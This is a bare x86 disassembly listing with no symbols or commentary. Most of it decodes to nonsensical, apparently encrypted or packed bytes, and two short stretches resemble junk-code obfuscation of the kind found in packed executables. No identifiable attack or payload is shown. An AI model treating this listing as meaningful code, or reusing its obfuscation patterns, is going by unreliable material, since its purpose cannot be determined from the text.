  42067d:	sub    DWORD PTR [esp+ebx*1+0x399b6ed6],eax
  420684:	in     eax,dx
  420685:	mov    al,ds:0x18407562
  42068a:	jecxz  0x4206d3
  42068c:	dec    eax
  42068d:	mov    ebp,0x555c79e1
  420692:	popa   
  420693:	mov    es,WORD PTR [eax-0x283b36ba]
  420699:	mov    edi,0xce0bdcb4
  42069e:	hlt    
  42069f:	or     BYTE PTR [ebx+0x77320fe6],bh
  4206a5:	je     0x4206a9
  4206a7:	jmp    0x4ba2:0xf83b17df
  4206ae:	sahf   
  4206af:	repz cdq 
  4206b1:	stc    
  4206b2:	scas   al,BYTE PTR es:[edi]
  4206b3:	cmc    
  4206b4:	push   ecx
  4206b5:	lds    eax,FWORD PTR [edx-0xed90425]
  4206bb:	out    0xd2,al
  4206bd:	mov    ah,0xdc
  4206bf:	out    0x2,eax
  4206c1:	iret   
  4206c2:	pushf  
  4206c3:	jl     0x4206b7
  4206c5:	in     eax,dx
  4206c6:	push   edx
  4206c7:	or     eax,0xbbd3b845
  4206cc:	dec    eax
  4206cd:	xchg   ebx,eax
  4206ce:	ret    
  4206cf:	pop    esp
  4206d0:	clc    
  4206d1:	push   esp
  4206d2:	mov    ah,0xf7
  4206d4:	aas    
  4206d5:	int    0x6f
  4206d7:	push   ebx
  4206d8:	jne    0x4206ac
  4206da:	out    dx,al
  4206db:	push   esp
  4206dc:	std    
  4206dd:	test   BYTE PTR [edx],cl
  4206df:	(bad)  
  4206e1:	jae    0x4206fc
  4206e3:	dec    eax
  4206e4:	jbe    0x4206a3
  4206e6:	jl     0x42074b
  4206e8:	shl    ecx,1
  4206ea:	adc    dh,bh
  4206ec:	mov    eax,DWORD PTR [edi+eiz*4]
  4206ef:	push   ebp
  4206f0:	dec    edi
  4206f1:	mov    dh,0xd
  4206f3:	dec    esp
  4206f4:	repnz adc eax,0x6b220990
  4206fa:	sub    al,0xc5
  4206fc:	mov    ch,0x12
  4206fe:	pop    ebx
  4206ff:	add    BYTE PTR [ebp-0x5b99a6fc],dl
  420705:	repnz daa 
  420707:	inc    ebp
  420708:	sbb    eax,DWORD PTR [eax+0x7]
  42070b:	ins    DWORD PTR es:[edi],dx
  42070c:	test   eax,0xbf7babb2
  420711:	sub    bh,BYTE PTR [ebx+0x1f]
  420714:	es pop ss
  420716:	fsub   QWORD PTR fs:[edx+ecx*4-0x4d]
  42071b:	sub    edx,edi
  42071d:	jg     0x4206d7
  42071f:	dec    edx
  420720:	xor    edx,ebp
  420722:	mov    DWORD PTR [ebp-0xc],esp
  420725:	inc    edi
  420726:	pop    ds
  420727:	pop    es
  420728:	sub    BYTE PTR [edi*1-0x79c8262e],ch
  42072f:	ror    bh,cl
  420731:	cmp    BYTE PTR [eax],ah
  420733:	xor    eax,0xbb0632db
  420738:	scas   eax,DWORD PTR es:[edi]
  420739:	pop    edx
  42073a:	stc    
  42073b:	aam    0x81
  42073d:	xchg   ebx,eax
  42073e:	pop    edi
  42073f:	ret    
  420740:	rol    BYTE PTR [ebp+0x16],0x43
  420744:	sbb    al,0x65
  420746:	ror    DWORD PTR [edi],1
  420748:	inc    ebx
  420749:	outs   dx,DWORD PTR ds:[esi]
  42074a:	push   es
  42074b:	test   al,0xd0
  42074d:	xor    DWORD PTR [edx+0x12],ebx
  420750:	popa   
  420751:	dec    edi
  420752:	adc    al,0x43
  420754:	pop    ds
  420755:	cwde   
  420756:	sbb    dl,cl
  420758:	mov    ds,ebp
  42075a:	jl     0x42073b
  42075c:	inc    eax
  42075d:	push   ss
  42075e:	pusha  
  42075f:	lock test BYTE PTR ds:0x8209e67f,ah
  420766:	mov    eax,ds:0xa192dddb
  42076b:	pop    ebx
  42076c:	ret    
  42076d:	gs ins BYTE PTR es:[edi],dx
  42076f:	out    dx,al
  420770:	rol    BYTE PTR gs:[eax+0x6fe0c1ec],1
  420777:	stc    
  420778:	xor    eax,0x380e71cb
  42077d:	test   al,0x6c
  42077f:	stos   DWORD PTR es:[edi],eax
  420780:	inc    esi
  420781:	(bad)  
  420782:	mov    esp,0xed9e5b46
  420787:	lds    ecx,FWORD PTR [esi]
  420789:	out    dx,al
  42078a:	int    0x10
  42078c:	aam    0x9f
  42078e:	jge    0x4207d3
  420790:	dec    ecx
  420791:	inc    ecx
  420792:	xchg   ebp,eax
  420793:	sub    BYTE PTR [ebp-0x71eb38b0],0x22
  42079a:	sub    BYTE PTR [ecx+eax*2-0x6378d244],bh
  4207a1:	lds    esp,FWORD PTR ds:0x95e89b98
  4207a7:	inc    ebx
  4207a8:	inc    edi
  4207a9:	or     ah,cl
  4207ab:	and    BYTE PTR [ebp-0xeb2c6f2],cl
  4207b1:	out    dx,al
  4207b2:	add    bh,BYTE PTR [ebp+edi*1+0x57134b61]
  4207b9:	mov    dl,0x75
  4207bb:	pop    edi
  4207bc:	cdq    
  4207bd:	repnz scas eax,DWORD PTR es:[edi]
  4207bf:	stos   DWORD PTR es:[edi],eax
  4207c0:	out    0xd4,al
  4207c2:	lock jg 0x4207c3
  4207c5:	imul   ebx,DWORD PTR [ebx],0x17
  4207c8:	rcr    BYTE PTR [ebx],0xc6
  4207cb:	div    BYTE PTR [eax+0x3495946c]
  4207d1:	js     0x4207f3
  4207d3:	add    BYTE PTR [eax+0x3173c0af],0x44
  4207da:	mov    ebx,0x156a18d9
  4207df:	pop    ebx
  4207e0:	mov    esi,0x49a215fd
  4207e5:	or     al,0x79
  4207e7:	in     al,dx
  4207e8:	lds    ecx,FWORD PTR [ebx-0x2c]
  4207eb:	xlat   BYTE PTR ds:[ebx]
  4207ec:	xchg   ebp,eax
  4207ed:	dec    ecx
  4207ee:	ds sti 
  4207f0:	mov    ds:0x9b9397b2,eax
  4207f5:	pop    esp
  4207f6:	sub    al,0xcb
  4207f8:	fcom   QWORD PTR [esi+0xf3032a6]
  4207fe:	cmc    
  4207ff:	mov    ebx,0x78c86d6
  420804:	ins    BYTE PTR es:[edi],dx
  420805:	scas   eax,DWORD PTR es:[edi]
  420806:	loopne 0x420851
  420808:	mov    dh,BYTE PTR [ebx-0x75]
  42080b:	call   DWORD PTR [esi-0x16]
  42080e:	dec    edx
  42080f:	mov    esi,0x9c4bd20
  420814:	aas    
  420815:	in     eax,0x87
  420817:	sbb    BYTE PTR [ecx-0x44],dl
  42081a:	data16 mov bl,0x84
  42081d:	imul   edx,ebp,0xffffffb3
  420820:	add    DWORD PTR [edi+edx*1-0x57dfa155],0x7ee0db9b
  42082b:	pop    esp
  42082c:	sti    
  42082d:	add    BYTE PTR [ebx+0x4],0x72
  420831:	fwait
  420832:	call   0x86c0:0x9e97a56d
  420839:	aad    0x96
  42083b:	push   ebp
  42083c:	lods   eax,DWORD PTR ds:[esi]
  42083d:	scas   eax,DWORD PTR es:[edi]
  42083e:	lods   al,BYTE PTR ds:[esi]
  42083f:	pop    eax
  420840:	rcl    BYTE PTR [eax],1
  420842:	xchg   ebx,eax
  420843:	(bad)  
  420844:	lods   eax,DWORD PTR ds:[esi]
  420845:	sbb    dh,0x87
  420848:	jmp    0x831d56a9
  42084d:	les    eax,FWORD PTR [ebx+ecx*2]
  420850:	pop    eax
  420851:	xchg   ebp,eax
  420852:	or     dh,bh
  420854:	jg     0x420862
  420856:	or     ecx,DWORD PTR [ecx-0x61dc375b]
  42085c:	dec    ebx
  42085d:	inc    eax
  42085e:	shr    DWORD PTR [eax],cl
  420860:	jmp    0xa4ec:0xcae0f368
  420867:	in     al,dx
  420868:	sub    eax,0x97bf478c
  42086d:	mov    ds:0x99691475,al
  420872:	jne    0x42081d
  420874:	lahf   
  420875:	push   esi
  420876:	lds    eax,FWORD PTR [edx]
  420878:	dec    ebx
  420879:	loopne 0x42089d
  42087b:	and    esi,DWORD PTR [ecx+0x6f]
  42087e:	push   ebx
  42087f:	xchg   ecx,eax
  420880:	and    BYTE PTR [ebp+0x25],0xd1
  420884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420885:	jcxz   0x42082f
  420888:	dec    ebx
  420889:	pushf  
  42088a:	stc    
  42088b:	loopne 0x4208c2
  42088d:	mov    ebp,0x197bd34e
  420892:	or     al,0x6b
  420894:	push   DWORD PTR [eax]
  420896:	shl    BYTE PTR [ebp-0x1b],cl
  420899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089a:	shl    DWORD PTR [edx],1
  42089c:	pop    eax
  42089d:	arpl   WORD PTR [edx-0x4bf2cfde],bp
  4208a3:	aam    0xb9
  4208a5:	xchg   esp,eax
  4208a6:	and    eax,0x76
  4208a9:	sbb    eax,0x462c12bf
  4208ae:	ja     0x42085e
  4208b0:	sub    ebp,DWORD PTR [ecx]
  4208b2:	xchg   BYTE PTR [esi-0x8],bh
  4208b5:	pop    edx
  4208b6:	retf   
  4208b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208b8:	jmp    0xb86b6a03
  4208bd:	sti    
  4208be:	loopne 0x42092b
  4208c0:	and    DWORD PTR [si],edi
  4208c3:	retf   0x374b
  4208c6:	add    edx,DWORD PTR ss:[ecx]
  4208c9:	aas    
  4208ca:	mov    BYTE PTR [edx],al
  4208cc:	xor    BYTE PTR [esi-0x2d],dl
  4208cf:	out    dx,al
  4208d0:	(bad)  
  4208d1:	cmp    al,0x95
  4208d3:	xor    bl,ah
  4208d5:	adc    BYTE PTR [edx+0x63242da0],al
  4208db:	gs adc dl,dl
  4208de:	scas   eax,DWORD PTR es:[edi]
  4208df:	xlat   BYTE PTR ds:[ebx]
  4208e0:	push   ebp
  4208e1:	ret    
  4208e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208e3:	or     BYTE PTR [edx],0x6c
  4208e6:	pop    edx
  4208e7:	fdivr  QWORD PTR [edi]
  4208e9:	sbb    ch,BYTE PTR [ebx+0x33]
  4208ec:	test   DWORD PTR [eax],edx
  4208ee:	loope  0x4208e3
  4208f0:	xchg   esp,eax
  4208f1:	and    ebx,DWORD PTR [edi]
  4208f3:	leave  
  4208f4:	jmp    0x420905
  4208f6:	sbb    eax,0x43d84ed3
  4208fb:	stos   BYTE PTR es:[edi],al
  4208fc:	out    0xcb,eax
  4208fe:	cmp    edi,DWORD PTR [esi]
  420900:	iret   
  420901:	push   ebx
  420902:	adc    ebx,DWORD PTR [edi]
  420904:	iret   
  420905:	sub    eax,0xf9378690
  42090a:	cmp    eax,0xf34181e
  42090f:	shl    BYTE PTR [edi],1
  420911:	into   
  420912:	add    al,0x46
  420914:	jbe    0x420989
  420916:	lea    ebx,ds:0x18e20594
  42091c:	scas   al,BYTE PTR es:[edi]
  42091d:	rcr    BYTE PTR [eax+0x43016031],1
  420923:	shr    cl,1
  420925:	(bad)  
  420926:	jp     0x4208d0
  420928:	mov    ebx,0xab901898
  42092d:	mov    al,ds:0xda2d05c6
  420932:	xor    ebp,DWORD PTR [edi+0x64]
  420935:	jnp    0x4209a2
  420937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420939:	xchg   DWORD PTR [ecx],edi
  42093b:	call   DWORD PTR [ecx]
  42093d:	mov    al,0xbf
  42093f:	jp     0x42097a
  420941:	inc    ecx
  420942:	push   ss
  420943:	inc    eax
  420944:	or     al,0x28
  420946:	(bad)  
  420947:	mov    al,0x59
  420949:	mov    bh,0xa1
  42094b:	push   eax
  42094c:	push   esp
  42094d:	mov    ah,0xde
  42094f:	aam    0xd9
  420951:	sub    eax,0xb81c63ac
  420956:	sub    BYTE PTR [ebx-0x12396e16],al
  42095c:	(bad)  
  42095d:	hlt    
  42095e:	jbe    0x420986
  420960:	adc    eax,0x9344d291
  420965:	xchg   BYTE PTR [esi-0x6c9f038b],bl
  42096b:	push   cs
  42096c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42096d:	sbb    al,0x42
  42096f:	shl    DWORD PTR [edx+0xd186092],cl
  420975:	jg     0x42097e
  420977:	ror    DWORD PTR [eax+0xbe2e470],1
  42097d:	cmp    al,0x27
  42097f:	or     ebp,0xffffffa7
  420982:	jle    0x4209ca
  420984:	sbb    eax,eax
  420986:	not    bl
  420988:	stc    
  420989:	mov    ch,0x88
  42098b:	pop    edx
  42098c:	or     al,0x11
  42098e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42098f:	enter  0x92b7,0x56
  420993:	test   BYTE PTR [esi+eax*4],cl
  420996:	xchg   ebp,eax
  420997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420998:	clc    
  420999:	mov    bh,0x94
  42099b:	jmp    0xf334e171
  4209a0:	dec    ecx
  4209a1:	xchg   edi,eax
  4209a2:	adc    ebx,DWORD PTR [ebx+0x11]
  4209a5:	mov    edx,0xe7f7f6b0
  4209aa:	pop    esp
  4209ab:	sub    edi,ecx
  4209ad:	push   ds
  4209ae:	test   ch,bl
  4209b0:	mov    edi,0x848df669
  4209b5:	push   edx
  4209b6:	(bad)  [eax+0x6c85c7d0]
  4209bc:	(bad)  
  4209bd:	(bad)  
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428273
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42830f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428337,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42824f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42817b,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283b3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428337,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e60
  420a34:	sub    DWORD PTR ds:0x42830b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42823f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42829b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42830b
  420a66:	sub    DWORD PTR ds:0x42831f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42817f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428293,0x0
  420a81:	mov    DWORD PTR ds:0x4282fb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428333
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42827b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428293,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e64
  420abd:	mov    esi,DWORD PTR ds:0x42837b
  420ac3:	or     DWORD PTR ds:0x4282a3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281b3
  420ad1:	mov    esi,DWORD PTR ds:0x4283f7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42817b
  420ae2:	or     DWORD PTR ds:0x4282a3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428303,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xbe
  420b0e:	test   BYTE PTR [edi+0x6a],0x36
  420b12:	pop    ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x18e7e7ee],ah
  420b1a:	push   0xd1eb26d4
  420b1f:	cwde   
  420b20:	xchg   BYTE PTR [edx+0x3f],ch
  420b23:	push   es
  420b24:	out    dx,eax
  420b25:	aam    0xed
  420b27:	hlt    
  420b28:	add    ah,BYTE PTR [esi+0x1e]
  420b2b:	idiv   BYTE PTR [ebx+ebp*8-0x2fded866]
  420b32:	jo     0x420b53
  420b34:	sbb    eax,0x9c06ec4b
  420b39:	dec    ecx
  420b3a:	out    0xc5,al
  420b3c:	popa   
  420b3d:	jg     0x420ac3
  420b3f:	(bad)  
  420b40:	adc    ecx,ebp
  420b42:	ja     0x420b7a
  420b44:	push   esp
  420b45:	(bad)  
  420b46:	mov    ch,0x64
  420b48:	mov    eax,0x558b6e77
  420b4d:	aas    
  420b4e:	pop    esp
  420b4f:	les    ebx,FWORD PTR [ebp+0x1a]
  420b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b54:	mov    ch,0xcb
  420b56:	sub    ebx,DWORD PTR [eax-0x6c]
  420b59:	in     al,0xc8
  420b5b:	sbb    BYTE PTR [ebx-0x30eeb933],bl
  420b61:	ror    al,cl
  420b63:	bound  eax,QWORD PTR [eax]
  420b65:	shr    BYTE PTR [edx+0x5ddd0eb0],0x6
  420b6c:	cmp    al,0x49
  420b6e:	loope  0x420b59
  420b70:	push   ds
  420b71:	bnd jbe 0x420b4a
  420b74:	inc    ebp
  420b75:	aad    0x78
  420b77:	mov    al,ds:0x1b621e7f
  420b7c:	mov    al,bl
  420b7e:	cmp    DWORD PTR [ebx],0xf03679b3
  420b84:	mov    dh,0xc8
  420b86:	inc    esi
  420b87:	cs out 0xcc,eax
  420b8a:	xor    BYTE PTR [edi+0x42],0x99
  420b8e:	cs icebp 
  420b90:	(bad)  [ecx+0x3a]
  420b93:	push   esi
  420b94:	stc    
  420b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b96:	cmp    BYTE PTR [edi-0x4b],0xda
  420b9a:	test   BYTE PTR [edx],cl
  420b9c:	adc    eax,0xb7df22be
  420ba1:	xchg   edi,eax
  420ba2:	xchg   esp,eax
  420ba3:	push   ebp
  420ba4:	rol    ch,cl
  420ba6:	aas    
  420ba7:	repz bound esp,QWORD PTR [esp+eiz*4-0x4]
  420bac:	xchg   esi,eax
  420bad:	mov    ch,0xe9
  420baf:	(bad)  
  420bb0:	and    al,0xc2
  420bb2:	mov    ch,0xb5
  420bb5:	sub    BYTE PTR [eax+0xb],dh
  420bb8:	sub    eax,edx
  420bba:	sbb    BYTE PTR [esi+esi*4-0x7],0xd4
  420bbf:	and    al,0x4d
  420bc1:	jmp    0xc4b3:0xdd2a6a74
  420bc8:	sbb    esi,DWORD PTR [esp+edx*1+0x24]
  420bcc:	cwde   
  420bcd:	repnz mov eax,ds:0x870b36b1
  420bd3:	adc    al,0x6
  420bd5:	add    BYTE PTR [esi+0x47],ch
  420bd8:	data16 jne 0x420bdb
  420bdb:	int    0xb0
  420bdd:	pop    edx
  420bde:	xchg   ebp,eax
  420bdf:	inc    esi
  420be0:	enter  0x7a3a,0xa5
  420be4:	repz jbe 0x420bc7
  420be7:	or     eax,0xc89fa2f6
  420bec:	clc    
  420bed:	setb   ch
  420bf0:	repnz add al,BYTE PTR cs:[edi]
  420bf4:	and    ebp,DWORD PTR [esi+0x3080da4d]
  420bfa:	mov    ss,WORD PTR [edx+0x4fb757c5]
  420c00:	mov    ebp,0x71154443
  420c05:	or     BYTE PTR [ecx-0x786895f7],0x6e
  420c0c:	pop    edi
  420c0d:	add    ah,ah
  420c0f:	in     al,0xdb
  420c11:	dec    eax
  420c12:	(bad)  
  420c13:	das    
  420c14:	retf   0x95d9
  420c17:	call   0x799dad04
  420c1c:	fwait
  420c1d:	enter  0x6301,0xc0
  420c21:	and    bl,BYTE PTR [ecx+0x17063770]
  420c27:	push   ebx
  420c28:	inc    ebp
  420c29:	outs   dx,DWORD PTR ds:[esi]
  420c2a:	or     DWORD PTR [ecx+0x4b12ad2e],edx
  420c30:	xchg   edx,eax
  420c31:	jb     0x420cad
  420c33:	push   edi
  420c34:	inc    esi
  420c35:	(bad)  
  420c36:	(bad)
  420c39:	and    ch,bh
  420c3b:	dec    esi
  420c3c:	push   es
  420c3d:	jmp    0xca7d:0x267917fe
  420c44:	pop    ebp
  420c45:	inc    esi
  420c47:	mov    ds:0xb89c4d5f,al
  420c4c:	xor    al,0x7
  420c4e:	jnp    0x420c60
  420c50:	rol    BYTE PTR [edi-0x6345876e],0x47
  420c57:	test   ebx,esp
  420c59:	push   edi
  420c5a:	ins    BYTE PTR es:[edi],dx
  420c5b:	push   ss
  420c5c:	cmp    BYTE PTR [ebp+ecx*2-0xab5c5c4],ch
  420c63:	rol    ch,1
  420c65:	js     0x420bf7
  420c67:	fnstsw WORD PTR ds:0x899dc5f9
  420c6d:	idiv   dl
  420c6f:	getsec 
  420c71:	xchg   ebx,eax
  420c72:	jmp    0x722a10a0
  420c77:	adc    ecx,esi
  420c79:	adc    dl,BYTE PTR [ecx-0x80]
  420c7c:	std    
  420c7d:	into   
  420c7e:	mov    bh,BYTE PTR [ecx]
  420c80:	mov    esi,0xeda24869
  420c85:	and    DWORD PTR [esi*2+0x7fdb1840],edx
  420c8c:	lea    ecx,[eax]
  420c8e:	scas   eax,DWORD PTR es:[edi]
  420c8f:	(bad)  
  420c90:	and    al,cl
  420c92:	mov    eax,ds:0x1cba7d0a
  420c97:	(bad)  
  420c99:	sbb    cl,BYTE PTR [edi+0xb11a756]
  420c9f:	iret   
  420ca0:	xor    edi,DWORD PTR [ecx-0x5f]
  420ca3:	fiadd  WORD PTR [eax+ebx*8+0x18]
  420ca7:	loopne 0x420c75
  420ca9:	push   edx
  420caa:	mov    al,0x5e
  420cac:	test   edi,0xd80a5d96
  420cb2:	jp     0x420c60
  420cb4:	idiv   BYTE PTR [ecx-0x79968385]
  420cba:	mov    ebp,0xb3c1c6b6
  420cbf:	stc    
  420cc0:	dec    edx
  420cc1:	push   ebp
  420cc2:	mov    ebx,0xfe852faa
  420cc7:	ror    DWORD PTR [edi-0x79],1
  420cca:	fst    DWORD PTR [ebp-0xb]
  420ccd:	and    al,0xad
  420ccf:	push   esp
  420cd0:	in     al,dx
  420cd1:	or     BYTE PTR [ecx],ch
  420cd3:	imul   edx,DWORD PTR [ecx],0xa2b051f9
  420cd9:	mov    bl,0xec
  420cdb:	cdq    
  420cdc:	lock lods eax,DWORD PTR ds:[esi]
  420cde:	in     eax,0x69
  420ce0:	and    BYTE PTR [ebp+edi*8-0x27],ch
  420ce4:	in     eax,dx
  420ce5:	push   eax
  420ce6:	outs   dx,DWORD PTR ds:[esi]
  420ce7:	and    al,0x7f
  420ce9:	pop    edx
  420cea:	dec    ecx
  420ceb:	add    DWORD PTR [ebp-0x29c33a97],esp
  420cf1:	mov    bl,0x37
  420cf3:	test   al,0x93
  420cf5:	int3   
  420cf6:	sub    BYTE PTR [ecx-0x17],bh
  420cf9:	mov    esp,0xc9832815
  420cfe:	mov    ah,0x6
  420d00:	in     al,dx
  420d01:	push   eax
  420d02:	pop    eax
  420d03:	ficomp DWORD PTR [ebp-0x23d4258e]
  420d09:	dec    eax
  420d0a:	pop    ss
  420d0b:	sar    BYTE PTR [esi],cl
  420d0d:	(bad)  
  420d0f:	add    esi,DWORD PTR [ecx+0x3410ff69]
  420d15:	loope  0x420cb7
  420d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d18:	das    
  420d19:	or     cl,bh
  420d1b:	nop
  420d1c:	mov    WORD PTR [edx-0x1f2c6a5b],ss
  420d22:	push   0xffffffa2
  420d24:	xchg   ecx,eax
  420d25:	push   cs
  420d26:	in     al,dx
  420d27:	cmp    bh,BYTE PTR [ecx]
  420d29:	test   al,0x85
  420d2b:	popa   
  420d2c:	cwde   
  420d2d:	ss dec esp
  420d2f:	jae    0x420d93
  420d31:	sub    ebx,DWORD PTR [ebx]
  420d33:	fs ins DWORD PTR es:[edi],dx
  420d35:	adc    dh,BYTE PTR gs:[edi]
  420d38:	mov    ebp,0xe2308aa3
  420d3d:	mov    DWORD PTR [esi+0x74d9cc12],esp
  420d43:	pop    ebp
  420d44:	aam    0x67
  420d46:	test   al,0xb4
  420d48:	std    
  420d49:	sbb    DWORD PTR [ebp+0x4],esi
  420d4c:	mov    ch,0xe4
  420d4e:	pop    esp
  420d4f:	scas   eax,DWORD PTR es:[edi]
  420d50:	lds    esp,FWORD PTR [edx+0x78]
  420d53:	aaa    
  420d54:	jge    0x420d0a
  420d56:	fwait
  420d57:	push   cs
  420d58:	sub    al,0x8
  420d5a:	pop    ss
  420d5b:	out    0xee,al
  420d5d:	and    esp,DWORD PTR ds:0xd3c4ec48
  420d63:	sub    al,0xa9
  420d65:	dec    edi
  420d66:	pop    ds
  420d67:	std    
  420d68:	das    
  420d69:	enter  0xfaae,0x2c
  420d6d:	or     eax,0xb435aff6
  420d72:	mov    edi,0x4e6ed1fc
  420d77:	jo     0x420d2b
  420d79:	out    0xcd,al
  420d7b:	adc    ah,BYTE PTR [edx-0x5971de9b]
  420d81:	psubusb mm7,QWORD PTR [ebp-0x48]
  420d85:	xor    al,0xa3
  420d87:	sbb    eax,0x5c7fa484
  420d8c:	mov    ds:0x8843f19b,al
  420d91:	sub    eax,0x9ad2e6c0
  420d96:	ins    BYTE PTR es:[edi],dx
  420d97:	enter  0x729b,0x8b
  420d9b:	cmp    BYTE PTR [edx-0x5c67ab60],dl
  420da1:	jns    0x420d7c
  420da3:	sbb    al,0xf2
  420da5:	sbb    sp,WORD PTR [edi+0x7b]
  420da9:	imul   edi,DWORD PTR [edx],0x22
  420dac:	dec    esp
  420dad:	sbb    al,0xb3
  420daf:	push   cs
  420db0:	mov    dl,0x38
  420db2:	test   BYTE PTR [ecx-0x2c],dh
  420db5:	add    BYTE PTR [ebp+edx*1-0x1a],ch
  420db9:	xor    DWORD PTR [edx-0x70],edi
  420dbc:	and    al,BYTE PTR [ebp+0x5b6a09af]
  420dc2:	fadd   DWORD PTR [eax]
  420dc4:	or     DWORD PTR [eax+0x4b],ebp
  420dc7:	lds    esi,FWORD PTR [ecx+ecx*4-0x63f644b9]
  420dce:	xor    dh,BYTE PTR [esi]
  420dd0:	cmp    edx,DWORD PTR [eax-0x680ab37c]
  420dd6:	jp     0x420d6e
  420dd8:	stos   BYTE PTR es:[edi],al
  420dd9:	and    al,0x9d
  420ddb:	adc    al,0xab
  420ddd:	push   cs
  420dde:	dec    ecx
  420ddf:	mov    WORD PTR [ebx+0x3],?
  420de2:	dec    esi
  420de3:	sbb    al,0x7c
  420de5:	fnstsw WORD PTR [edx]
  420de7:	bound  eax,QWORD PTR [edi-0x49]
  420dea:	push   ss
  420deb:	pop    edi
  420dec:	cmp    BYTE PTR [edx+0x63],dl
  420def:	mov    esi,0xd9f13753
  420df4:	push   es
  420df5:	xor    al,0x58
  420df7:	jb     0x420e17
  420df9:	jmp    0xb1255068
  420dfe:	cs mov al,0xb1
  420e01:	inc    esi
  420e02:	xchg   edx,edi
  420e04:	jns    0x420e5c
  420e06:	inc    esi
  420e07:	mov    ds:0xb882cda4,al
  420e0c:	(bad)  
  420e0d:	enter  0x76f5,0x48
  420e11:	jle    0x420dc9
  420e13:	(bad)  [edi+edx*4-0x17]
  420e17:	leave  
  420e18:	sub    ecx,DWORD PTR [edx+0x6d2a40ed]
  420e1e:	xchg   esp,eax
  420e1f:	mov    ch,0xe2
  420e21:	cmp    al,0x57
  420e23:	aas    
  420e24:	daa    
  420e25:	inc    esi
  420e26:	cwde   
  420e27:	push   ebx
  420e28:	inc    edi
  420e29:	(bad)  
  420e2a:	repnz outs dx,BYTE PTR ds:[esi]
  420e2c:	jbe    0x420ddd
  420e2e:	cmp    al,0x66
  420e30:	jle    0x420e45
  420e32:	or     eax,0xd3813548
  420e37:	cmp    al,ch
  420e39:	lock push ecx
  420e3b:	mov    al,ds:0xd0538b75
  420e40:	es xchg ecx,eax
  420e42:	or     dh,BYTE PTR [eax]
  420e44:	push   es
  420e45:	cmc    
  420e46:	and    ebp,DWORD PTR [ecx+0x558932a0]
  420e4c:	mov    esp,0x8e80e210
  420e51:	or     ah,bh
  420e53:	and    DWORD PTR [ebp+0x5b],ebp
  420e56:	add    al,0x41
  420e58:	sub    edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x42819b
  420e64:	sbb    DWORD PTR ds:0x42838f,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x4283ab,0x0
  420e74:	mov    DWORD PTR ds:0x428263,ebx
  420e7a:	mov    DWORD PTR ds:0x42819b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42818f
  420e8e:	mov    DWORD PTR ds:0x428273,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283ab,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428247
  420eaa:	push   0x4280af
  420eaf:	call   DWORD PTR ds:0x428e68
  420eb5:	add    ecx,DWORD PTR ds:0x4283a7
  420ebb:	xor    esi,DWORD PTR ds:0x42823f
  420ec1:	adc    DWORD PTR ds:0x428297,edx
  420ec7:	xor    DWORD PTR ds:0x42831f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42824b
  420ed3:	or     esi,DWORD PTR ds:0x4281a7
